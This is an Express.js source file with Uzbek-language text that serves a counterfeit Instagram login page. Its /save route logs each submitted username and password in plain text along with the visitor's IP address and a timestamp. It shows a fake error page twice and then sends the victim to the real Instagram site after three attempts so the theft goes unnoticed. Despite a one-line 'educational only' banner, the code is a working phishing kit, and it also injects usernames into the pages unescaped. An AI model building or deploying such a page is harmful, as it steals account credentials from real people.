const express = require("express");
const session = require("express-session");
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Session konfiguratsiyasi
app.use(session({
    secret: 'instagram-session',
    resave: false,
    saveUninitialized: true,
    cookie: { 
        secure: false,
        maxAge: 15 * 60 * 1000 // 15 daqiqa
    }
}));

app.post("/save", (req, res) => {
    const { username, password } = req.body;
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "unknown";
    const time = new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent" });

    console.log(`KIRITILDI → ${time} | IP: ${ip} | USER: ${username} | PASS: ${password}`);

    // Har bir foydalanuvchi uchun alohida urinishlar sonini hisoblash
    if (!req.session[username]) {
        req.session[username] = 1;
    } else {
        req.session[username]++;
    }

    const attempts = req.session[username];
    console.log(`${username} uchun urinishlar soni: ${attempts}`);

    // Agar 3 marta yoki undan ko'p urinib ko'rgan bo'lsa
    if (attempts >= 3) {
        console.log(`3 MARTA TOLDI → ${username} Instagramga yo'naltirildi`);
        delete req.session[username]; // Hisobni tozalash
        res.redirect("https://www.instagram.com");
    } else {
        // Hali 3 marta emas
        const qolgan = 3 - attempts;
        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="utf-8">
                <title>Xato</title>
                <style>
                    * {
                        margin: 0;
                        padding: 0;
                        box-sizing: border-box;
                    }
                    body {
                        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        min-height: 100vh;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                    }
                    .container {
                        background: white;
                        border-radius: 20px;
                        padding: 40px;
                        box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                        text-align: center;
                        width: 90%;
                        max-width: 450px;
                        animation: fadeIn 0.5s ease;
                    }
                    @keyframes fadeIn {
                        from { opacity: 0; transform: translateY(-20px); }
                        to { opacity: 1; transform: translateY(0); }
                    }
                    .warning-icon {
                        font-size: 60px;
                        color: #ff4757;
                        margin-bottom: 20px;
                        animation: shake 0.5s ease infinite alternate;
                    }
                    @keyframes shake {
                        from { transform: translateX(-2px); }
                        to { transform: translateX(2px); }
                    }
                    h2 {
                        color: #333;
                        margin-bottom: 15px;
                        font-size: 24px;
                    }
                    .error-text {
                        color: #ff4757;
                        font-size: 18px;
                        margin-bottom: 10px;
                        font-weight: bold;
                    }
                    .attempts-box {
                        background: #ffeaa7;
                        padding: 15px;
                        border-radius: 10px;
                        margin: 20px 0;
                        border-left: 5px solid #fdcb6e;
                    }
                    .attempts-count {
                        font-size: 28px;
                        color: #e17055;
                        font-weight: bold;
                    }
                    .attempts-label {
                        color: #636e72;
                        font-size: 14px;
                        margin-top: 5px;
                    }
                    .info {
                        color: #636e72;
                        margin: 15px 0;
                        font-size: 14px;
                    }
                    .btn {
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        color: white;
                        border: none;
                        padding: 15px 30px;
                        border-radius: 50px;
                        font-size: 16px;
                        font-weight: bold;
                        cursor: pointer;
                        transition: all 0.3s ease;
                        margin-top: 10px;
                        width: 100%;
                    }
                    .btn:hover {
                        transform: translateY(-2px);
                        box-shadow: 0 10px 20px rgba(0,0,0,0.2);
                    }
                    .loader {
                        width: 100%;
                        height: 4px;
                        background: #dfe6e9;
                        border-radius: 2px;
                        margin-top: 20px;
                        overflow: hidden;
                    }
                    .loader-bar {
                        width: 100%;
                        height: 100%;
                        background: #00b894;
                        animation: load 3s linear;
                    }
                    @keyframes load {
                        from { transform: translateX(-100%); }
                        to { transform: translateX(0); }
                    }
                    .username {
                        color: #0984e3;
                        font-weight: bold;
                        font-size: 18px;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="warning-icon">⚠️</div>
                    <h2>Login yoki parol noto'g'ri</h2>
                    
                    <div class="error-text">Kiritilgan ma'lumotlar tekshiruvdan o'tmadi</div>
                    
                    <div class="attempts-box">
                        <div class="attempts-count">${attempts}/3</div>
                        <div class="attempts-label">urinish</div>
                    </div>
                    
                    <div class="info">
                        Foydalanuvchi: <span class="username">${username}</span><br>
                        Qolgan urinishlar: <strong>${qolgan}</strong> ta
                    </div>
                    
                    <button class="btn" onclick="location.href='/'">Qayta urinish</button>
                    
                    <div class="loader">
                        <div class="loader-bar"></div>
                    </div>
                </div>
                
                <script>
                    // 3 soniyadan keyin avtomatik qaytish
                    setTimeout(() => {
                        location.href = '/';
                    }, 3000);
                    
                    // Har bir urinishda localStorage'da saqlash (qo'shimcha)
                    let attempts = localStorage.getItem('${username}_attempts') || 0;
                    localStorage.setItem('${username}_attempts', ${attempts});
                </script>
            </body>
            </html>
        `);
    }
});

// Asosiy sahifa (login formasi)
app.get("/", (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <title>Instagram Login</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }
                body {
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                    background: #fafafa;
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                }
                .login-container {
                    width: 350px;
                    margin: 0 auto;
                    padding: 40px 0;
                }
                .login-box {
                    background: white;
                    border: 1px solid #dbdbdb;
                    padding: 40px 40px 20px;
                    text-align: center;
                }
                .logo {
                    font-family: 'Billabong', cursive;
                    font-size: 50px;
                    margin-bottom: 30px;
                    color: #262626;
                }
                .input-group {
                    margin-bottom: 10px;
                }
                input {
                    width: 100%;
                    padding: 10px;
                    background: #fafafa;
                    border: 1px solid #dbdbdb;
                    border-radius: 3px;
                    font-size: 14px;
                    color: #262626;
                }
                input:focus {
                    outline: none;
                    border-color: #a8a8a8;
                }
                .login-btn {
                    width: 100%;
                    padding: 10px;
                    background: #0095f6;
                    color: white;
                    border: none;
                    border-radius: 8px;
                    font-weight: bold;
                    font-size: 14px;
                    margin: 15px 0;
                    cursor: pointer;
                    transition: background 0.3s;
                }
                .login-btn:hover {
                    background: #0081d6;
                }
                .separator {
                    display: flex;
                    align-items: center;
                    margin: 20px 0;
                    color: #8e8e8e;
                    font-size: 13px;
                }
                .separator::before,
                .separator::after {
                    content: "";
                    flex: 1;
                    height: 1px;
                    background: #dbdbdb;
                }
                .separator span {
                    padding: 0 20px;
                }
                .footer {
                    margin-top: 20px;
                    padding: 20px;
                    background: white;
                    border: 1px solid #dbdbdb;
                    text-align: center;
                    font-size: 14px;
                    color: #8e8e8e;
                }
                .footer a {
                    color: #00376b;
                    text-decoration: none;
                    font-weight: bold;
                }
                .info-box {
                    background: #fff3cd;
                    border: 1px solid #ffeaa7;
                    border-radius: 5px;
                    padding: 15px;
                    margin-bottom: 20px;
                    font-size: 13px;
                    color: #856404;
                    text-align: left;
                }
                .info-box strong {
                    display: block;
                    margin-bottom: 5px;
                }
                @font-face {
                    font-family: 'Billabong';
                    src: url('https://fonts.cdnfonts.com/s/13949/Billabong.woff') format('woff');
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <div class="login-box">
                    <div class="logo">Instagram</div>
                    
                    <div class="info-box">
                        <strong>⚠️ Diqqat!</strong>
                        Bu sahifa faqat o'quv maqsadida yaratilgan.
                        Har qanday parol kiritishingiz mumkin.
                    </div>
                    
                    <form action="/save" method="POST">
                        <div class="input-group">
                            <input type="text" name="username" placeholder="Telefon raqam, foydalanuvchi nomi yoki elektron pochta" required>
                        </div>
                        <div class="input-group">
                            <input type="password" name="password" placeholder="Parol" required>
                        </div>
                        <button type="submit" class="login-btn">Kirish</button>
                    </form>
                    
                    <div class="separator">
                        <span>YOKI</span>
                    </div>
                    
                    <div style="color: #385185; font-weight: bold; font-size: 14px; cursor: pointer; margin-bottom: 20px;">
                        Facebook bilan kirish
                    </div>
                    
                    <div style="font-size: 12px; color: #00376b;">
                        Parolingizni unutdingizmi?
                    </div>
                </div>
                
                <div class="footer">
                    Hisobingiz yo'qmi? <a href="#">Ro'yxatdan o'ting</a>
                </div>
            </div>
            
            <script>
                // Yaroqli email/username formatini tekshirish
                document.querySelector('input[name="username"]').addEventListener('blur', function(e) {
                    const value = e.target.value;
                    if (value.includes('@') && !value.includes('@gmail.com') && !value.includes('@mail.ru')) {
                        alert('Iltimos, to\'g\'ri email manzil kiriting');
                    }
                });
                
                // Enter bosganda formani yuborish
                document.querySelector('form').addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        this.submit();
                    }
                });
            </script>
        </body>
        </html>
    `);
});

const port = process.env.PORT || 3000;
app.listen(port, "0.0.0.0", () => {
    console.log(`✅ Server ${port}-portda ishga tushdi`);
    console.log(`🌐 http://localhost:${port} manziliga kiring`);
});
